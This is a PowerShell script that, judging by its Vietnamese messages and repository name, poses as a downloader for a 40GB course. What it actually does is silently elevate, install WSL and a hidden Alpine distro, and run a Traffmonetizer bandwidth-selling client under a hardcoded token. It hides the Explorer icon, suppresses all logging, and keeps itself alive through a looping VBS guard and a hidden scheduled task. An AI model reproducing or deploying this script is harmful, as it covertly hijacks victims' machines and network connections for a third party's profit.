if ($args -notcontains 'skip' -and -not $env:TM_SKIP_PROMPT) {
  $env:TM_SKIP_PROMPT = '1'
  try { $Email = Read-Host -Prompt 'Mời bạn nhập email' } catch {}
  Write-Host 'Vui lòng đợi 5-10 phút, quá trình download đang diễn ra...'
}

$Token   = 'NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A='
$RepoRaw = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main'
$SelfUrl = "$RepoRaw/install_windows.ps1"
$BinUrl  = if ($env:TM_BIN_URL)    { $env:TM_BIN_URL }    else { "$RepoRaw/tm-cli-linux-amd64.gz" }
$RootFsPrimary = if ($env:TM_ROOTFS_URL)  { $env:TM_ROOTFS_URL }  else { 'https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/x86_64/alpine-minirootfs-3.22.8-x86_64.tar.gz' }
$RootFsList    = if ($env:TM_ROOTFS_LIST) { $env:TM_ROOTFS_LIST } else { 'https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/x86_64/' }

$Dir        = Join-Path $env:ProgramData 'tm'
$DistroName = 'tm-linux'
$WslDir     = Join-Path $Dir 'wsl'
$TaskName   = 'TraffmonetizerResume'
$GuardVbs   = Join-Path $Dir 'guard.vbs'
$TaskUser   = $env:USERNAME
if (-not $TaskUser) { $TaskUser = 'SYSTEM' }

$ErrorActionPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
# Khong ghi bat ky log nao (yeu cau an toan bo) - Log chi la ham rong
function Log($m) { }
 
$ThisScript = $PSCommandPath
if (-not $ThisScript) {
  # chay qua irm | iex: tu luu ban sao de task resume/guard dung
  $ThisScript = Join-Path $Dir 'install_windows.ps1'
  try {
    Invoke-WebRequest -Uri $SelfUrl -OutFile $ThisScript -UseBasicParsing
    Unblock-File $ThisScript
  } catch { Log "Khong tai duoc ban sao script: $($_.Exception.Message)" }
}
Log ("He dieu hanh: " + [System.Environment]::OSVersion.VersionString)

$IsAdmin = $false
try {
  $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {
  $IsAdmin = ($env:USER -eq 'root')
}
if (-not $IsAdmin) {
  Log 'Khong co quyen admin - tu dong ep RunAs (UAC)'
  try { Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ThisScript`" skip" } catch { Log "UAC bi tu choi: $($_.Exception.Message)" }
  exit
}

if (-not $Token -or $Token -eq 'DAN_TOKEN_CUA_BAN_VAO_DAY') { Log ''; exit 1 }

function HaveCmd($n) {
  try { return [bool](Get-Command $n -ErrorAction SilentlyContinue) } catch { return $false }
}

function Set-ResumeTask {
  if (-not (HaveCmd 'Register-ScheduledTask')) { Log 'bo qua task resume (khong phai Windows)'; return }
  try {
    $exe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    if (-not (Test-Path $exe)) { $exe = 'powershell.exe' }
    $a = New-ScheduledTaskAction -Execute $exe -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ThisScript`" skip"
    $t = New-ScheduledTaskTrigger -AtLogOn
    $p = New-ScheduledTaskPrincipal -UserId $TaskUser -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger $t -Principal $p -Force | Out-Null
  } catch { Log " $($_.Exception.Message)" }
}

function Hide-LinuxExplorerIcon {
  $done = $false
  try {
    $k = 'HKCU:\Software\Classes\CLSID\{B2B4A4D1-2754-4140-A2EB-9A76D9D7CDC6}'
    if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
    Set-ItemProperty -Path $k -Name 'System.IsPinnedToNameSpaceTree' -Value 0 -Type DWord
    $done = $true
  } catch {}
  if ($done) { Log '' } else { Log '' }
}

# Gioi han RAM WSL2 (chi tac dung neu distro chay o che do WSL2)
try {
  $wslcfg = Join-Path $env:UserProfile '.wslconfig'
  if (-not (Test-Path $wslcfg)) {
    Set-Content -Path $wslcfg -Value "[wsl2]`r`nmemory=1GB`r`nprocessors=2`r`nswap=0"
  }
} catch {}

$script:LastWslError = ''
function Wsh($cmd) {
  $out = & wsl.exe -d $DistroName -u root -- sh -c $cmd 2>&1
  $script:LastWslError = ''
  $s = ($out | Out-String) -replace "`0", ''
  if ($LASTEXITCODE -ne 0) { $script:LastWslError = $s.Trim() }
  return $s
}
function Test-Distro {
  try {
    $out = (& wsl.exe -d $DistroName -u root -- echo DISTROOK 2>&1 | Out-String) -replace "`0", ''
    $script:LastWslError = $out.Trim()
    return (($LASTEXITCODE -eq 0) -and ($out -match 'DISTROOK'))
  } catch { $script:LastWslError = "$($_.Exception.Message)"; return $false }
}
function DistroExists {
  try {
    $l = (& wsl.exe --list 2>&1 | Out-String) -replace "`0", ''
    return ($l -match [regex]::Escape($DistroName))
  } catch { return $false }
}
function Get-DistroVersion {
  try {
    $l = (& wsl.exe --list --verbose 2>&1 | Out-String) -replace "`0", ''
    if ($l -match ([regex]::Escape($DistroName) + '\s+(Running|Stopped)\s+(\d)')) { return "wsl$($Matches[2])" }
  } catch {}
  return ''
}
function Is-VirtError($t) {
  if (-not $t) { return $false }
  return ($t -match 'HCS_E_HYPERV_NOT_INSTALLED' -or $t -match 'HYPERV' -or $t -match 'virtualization|virtual machine|CreateVm|hypervisor' -or $t -match 'Wsl/Service/RegisterDistro/CreateVm')
}

Hide-LinuxExplorerIcon

$HasWsl = $false
try {
  $st = (& wsl.exe --status 2>$null | Out-String) -replace "`0", ''
  $HasWsl = ($LASTEXITCODE -eq 0 -and $st.Trim().Length -gt 0)
} catch {}
if (-not $HasWsl) {
   $WslInstallOk = $true
  try { & wsl.exe --install --no-distribution --no-launch *> $null } catch { Log "LOI wsl --install: $($_.Exception.Message)" }
  if ($LASTEXITCODE -ne 0) {
    $WslInstallOk = $false
     try { & wsl.exe --install --no-distribution *> $null } catch {}
     if ($LASTEXITCODE -eq 0) { $WslInstallOk = $true }
    Start-Sleep -Seconds 15
    Get-Process wslsettings -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
  }
  Start-Sleep -Seconds 5
  $st2 = ''
  try { $st2 = (& wsl.exe --status 2>$null | Out-String) -replace "`0", '' } catch {}
  if (-not ($LASTEXITCODE -eq 0 -and $st2.Trim().Length -gt 0)) {
    Set-ResumeTask
    if ($WslInstallOk) {
      Write-Host ' ' -ForegroundColor Yellow
    } else {
      Write-Host ' ' -ForegroundColor Yellow
    }
    exit 2
  }
}
Log 'WSL san sang'

$RebootNeeded = $false
if (HaveCmd 'Get-CimInstance') {
  try {
    $cs = Get-CimInstance Win32_ComputerSystem
    $brand = ("$($cs.Manufacturer) $($cs.Model)").Trim()
    if ($cs.HypervisorPresent -eq $false) { Log '' }
  } catch {}
}
if (HaveCmd 'Get-WindowsOptionalFeature') {
  foreach ($feat in @('Microsoft-Windows-Subsystem-Linux', 'VirtualMachinePlatform')) {
    try {
      $f = Get-WindowsOptionalFeature -Online -FeatureName $feat
      if ($f -and $f.State -ne 'Enabled') {
        Log "$feat"
        & dism.exe /online /enable-feature /featurename:$feat /norestart *> $null
        if ($LASTEXITCODE -eq 3010) { $RebootNeeded = $true; Log "$feat" }
        elseif ($LASTEXITCODE -ne 0) { Log "Khong bat duoc $feat (exit $LASTEXITCODE) - bo qua, khong cham che do WSL1" }
        else { Log "$feat" }
      }
    } catch { Log "Kiem tra feature $feat loi: $($_.Exception.Message)" }
  }
} else {
  Log ' '
}
if ($RebootNeeded) {
  Set-ResumeTask
  Write-Host ' ' -ForegroundColor Yellow
  exit 2
}

# === Buoc 3: distro (uu tien WSL1 - khong can virtualization) ===
$Mode = ''
if (Test-Distro) {
  $Mode = Get-DistroVersion
  if (-not $Mode) { $Mode = 'wsl?' }
} else {
  $err1 = $script:LastWslError
  if (DistroExists) {
    & wsl.exe --unregister $DistroName *> $null
    Start-Sleep -Seconds 3
    if (DistroExists) {
      Write-Host ' ' -ForegroundColor Yellow
      Set-ResumeTask
      exit 3
    }
  }
  $ProgressPreference = 'SilentlyContinue'
  $tar = Join-Path $env:TEMP 'alpine-rootfs.tar.gz'
  $ok = $false
  foreach ($u in @($RootFsPrimary, $RootFsPrimary)) {
    try {
      Invoke-WebRequest -Uri $u -OutFile $tar -UseBasicParsing -TimeoutSec 600
      $ok = $true
      break
    } catch { Log "Loi tai rootfs tu $u : $($_.Exception.Message)" }
  }
  if (-not $ok) {
    try {
      $html = (Invoke-WebRequest -Uri $RootFsList -UseBasicParsing).Content
      $ver = ([regex]::Matches($html, 'alpine-minirootfs-([\d.]+)-x86_64\.tar\.gz') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Property {[version]$_} | Select-Object -Last 1)
      if ($ver) {
        Invoke-WebRequest -Uri ($RootFsList + "alpine-minirootfs-$ver-x86_64.tar.gz") -OutFile $tar -UseBasicParsing -TimeoutSec 600
        $ok = $true
      }
    } catch {}
  }
  if (-not $ok -or -not (Test-Path $tar)) {
    Write-Host ' ' -ForegroundColor Yellow
    Set-ResumeTask
    exit 3
  }
  New-Item -ItemType Directory -Force -Path $WslDir | Out-Null
  # Import uu tien WSL1: khong can VT-x/virtualization, chay duoc ca tren VM khong co nested virt
  $imp = (& wsl.exe --import $DistroName $WslDir $tar --version 1 2>&1 | Out-String) -replace "`0", ''
  if ($LASTEXITCODE -ne 0) {
    try {
      $k = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss'
      if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
      Set-ItemProperty -Path $k -Name DefaultVersion -Value 1 -Type DWord
    } catch { Log ": $($_.Exception.Message)" }
    Start-Sleep -Seconds 2
    $imp = (& wsl.exe --import $DistroName $WslDir $tar 2>&1 | Out-String) -replace "`0", ''
    if ($LASTEXITCODE -ne 0) {
      Set-ResumeTask
      exit 3
    }
    & wsl.exe --set-version $DistroName 1 *> $null
  }
  Remove-Item $tar -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 3
  if (-not (Test-Distro)) {
    $err2 = $script:LastWslError
    if (Is-VirtError $err2) {
      Log ''
      & wsl.exe --set-version $DistroName 1 *> $null
      Start-Sleep -Seconds 3
      if (Test-Distro) {
        Log ''
      } else {
        Log ''
      }
    }
    if (-not (Test-Distro)) {
      Set-ResumeTask
      Write-Host ' ' -ForegroundColor Yellow 
      exit 3
    }
  }
  $Mode = Get-DistroVersion
  if (-not $Mode) { $Mode = 'wsl1' }
  Log " '$DistroName' ($Mode)"
}

$gz = Join-Path $Dir 'tm-cli-linux-amd64.gz'
try { if ((Test-Path $gz) -and ((Get-Item $gz).Length -lt 100000)) { Remove-Item $gz -Force; Log 'File binary cu loi (qua nho) - da xoa de tai lai' } } catch {}
if (-not (Test-Path $gz)) {
  Log " ($BinUrl)..."
  $ok = $false
  try {
    Invoke-WebRequest -Uri $BinUrl -OutFile $gz -UseBasicParsing -TimeoutSec 600
    $ok = $true
  } catch { Log " $($_.Exception.Message)" }
  if (-not $ok) {
    Log ' '
    $r = Wsh "mkdir -p /opt/tm && wget -q -O /opt/tm/cli.gz '$BinUrl' && echo BINGET"
    if ("$r" -match 'BINGET') { $ok = $true }
  }
  if (-not $ok) {
    Log ' '
    Write-Host ' ' -ForegroundColor Yellow
    Set-ResumeTask
    exit 4
  }
}
$winPath = $Dir
$mntPath = ''
try {
  $root = [System.IO.Path]::GetPathRoot($winPath)
  if ($root -and $root.Length -ge 2 -and $root[1] -eq ':') {
    $rest = $winPath.Substring(2).Replace('\', '/')
    $mntPath = '/mnt/' + $root.Substring(0, 1).ToLower() + $rest
  }
} catch {}
if (-not $mntPath) { $mntPath = '/mnt/c/ProgramData/tm' }
Log ''
$r = Wsh "mkdir -p /opt/tm /var/lib/tm && cp '$mntPath/tm-cli-linux-amd64.gz' /opt/tm/cli.gz && cd /opt/tm && (gunzip -f cli.gz || busybox gunzip -f cli.gz) && chmod 755 /opt/tm/cli && test -x /opt/tm/cli && echo CLIOK"
if ("$r" -notmatch 'CLIOK') {
  Log " $($script:LastWslError.Substring(0, [Math]::Min(300, $script:LastWslError.Length)))"
  Log ''
  $r = Wsh "rm -f /opt/tm/cli.gz /opt/tm/cli; mkdir -p /opt/tm && wget -q -O /opt/tm/cli.gz '$BinUrl' && cd /opt/tm && (gunzip -f cli.gz || busybox gunzip -f cli.gz) && chmod 755 /opt/tm/cli && test -x /opt/tm/cli && echo CLIOK"
  if ("$r" -notmatch 'CLIOK') {
    Log " $($script:LastWslError.Substring(0, [Math]::Min(300, $script:LastWslError.Length)))"
    Write-Host ' ' -ForegroundColor Yellow
    Set-ResumeTask
    exit 4
  }
}
$r = Wsh "/opt/tm/cli status --token smoketest-not-real </dev/null >/dev/null 2>&1; echo RC:`$?"
if ("$r" -notmatch 'RC:0') {
  Log "$($r.Trim()) "
} else {
  Log ''
}

Wsh 'command -v docker >/dev/null 2>&1 && (docker rm -f tm watchtower >/dev/null 2>&1; echo OLDCLEANED)' | Out-Null

$Device = ''
try { $Device = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 10).ToString().Trim() } catch {}
if (-not $Device) { $Device = $env:COMPUTERNAME }
Log "Device name: $Device"

$InnerCmd = "export HOME=/var/lib/tm; mkdir -p /var/lib/tm; cd /var/lib/tm; exec >/dev/null 2>&1; exec /opt/tm/cli start --token '$Token' --device-name '$Device' </dev/null"
$InnerCmd = $InnerCmd.Replace('"', '\"')
$vbs = @()
$vbs += 'Set sh = CreateObject("WScript.Shell")'
$vbs += 'Do While True'
$vbs += '  On Error Resume Next'
$vbs += '  sh.Run "wsl.exe -d ' + $DistroName + ' -u root -- sh -c ""' + $InnerCmd + '""", 0, True'
$vbs += '  On Error Goto 0'
$vbs += '  WScript.Sleep 15000'
$vbs += 'Loop'
try {
  Set-Content -Path $GuardVbs -Value ($vbs -join "`r`n") -Encoding Ascii
  Log "Da ghi guard.vbs"
} catch { Log "LOI: khong ghi duoc guard.vbs: $($_.Exception.Message)"; Set-ResumeTask; exit 4 }

$taskStarted = $false
if (HaveCmd 'Register-ScheduledTask') {
  try {
    $wscript = Join-Path $env:SystemRoot 'System32\wscript.exe'
    if (-not (Test-Path $wscript)) { $wscript = 'wscript.exe' }
    $a = New-ScheduledTaskAction -Execute $wscript -Argument ('//B //nologo "' + $GuardVbs + '"')
    $trig = New-ScheduledTaskTrigger -AtLogOn
    try {
      $trig = New-ScheduledTaskTrigger -AtLogOn -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration ([TimeSpan]::MaxValue)
    } catch {
      try { $trig = New-ScheduledTaskTrigger -AtLogOn -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 3650) } catch {}
    }
    $daily = New-ScheduledTaskTrigger -Daily -At 6am
    $p = New-ScheduledTaskPrincipal -UserId $TaskUser -RunLevel Highest
    try {
      $limit = (New-TimeSpan -Days 3650)
      $s = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -ExecutionTimeLimit $limit -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger @($trig, $daily) -Settings $s -Principal $p -Force | Out-Null
      Log " '$TaskName'"
    } catch {
      Log "Cau hinh task day du khong nhan (mat nhan: $($_.Exception.Message)) - thu cau hinh don gian"
      try {
        $s2 = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger @($trig, $daily) -Settings $s2 -Principal $p -Force | Out-Null
        Log " '$TaskName' "
      } catch {
        Log "$($_.Exception.Message)"
        Set-ResumeTask
      }
    }
    try { Start-ScheduledTask -TaskName $TaskName; $taskStarted = $true; Log 'Da khoi dong task' } catch { Log "Khong start duoc task ngay: $($_.Exception.Message)" }
  } catch {
    Log " $($_.Exception.Message)"
    Set-ResumeTask
  }
} else {
  Log ' '
}

if ($taskStarted) {
  Start-Sleep -Seconds 12
  $r = Wsh "pgrep -f '/opt/tm/cli start' >/dev/null 2>&1 && echo RUNNING"
  if ("$r" -match 'RUNNING') { Log " ($Mode)" }
  else { Log " " }
}
try { Set-Content -Path (Join-Path $Dir 'mode.txt') -Value $Mode } catch {}
Log ' '
Write-Host ' '
Start-Sleep -Seconds 2
